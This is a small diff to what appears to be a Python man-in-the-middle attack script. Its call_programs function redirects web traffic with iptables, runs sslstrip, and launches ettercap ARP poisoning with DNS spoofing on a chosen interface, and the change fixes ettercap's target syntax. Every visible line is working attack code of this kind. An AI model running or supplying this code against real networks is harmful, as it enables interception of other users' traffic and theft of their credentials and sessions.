@@ -153,7 +153,7 @@ def call_programs(default_path):
     subprocess.call(["iptables","-t","nat","-A","PREROUTING","-i",sys.argv[2],"-p","tcp","--destination-port", \
         "80","-j","REDIRECT","--to-port","6666"])
     subprocess.Popen(["sslstrip","-l","6666"], stderr=subprocess.DEVNULL)
-    subprocess.call(["ettercap","-T","-q","-M","arp","-P","dns_spoof","//","//","-i",sys.argv[2]])
+    subprocess.call(["ettercap","-T","-q","-M","arp","-P","dns_spoof","///","///","-i",sys.argv[2]])
 
 def set_up_nginx(default_path):
     """
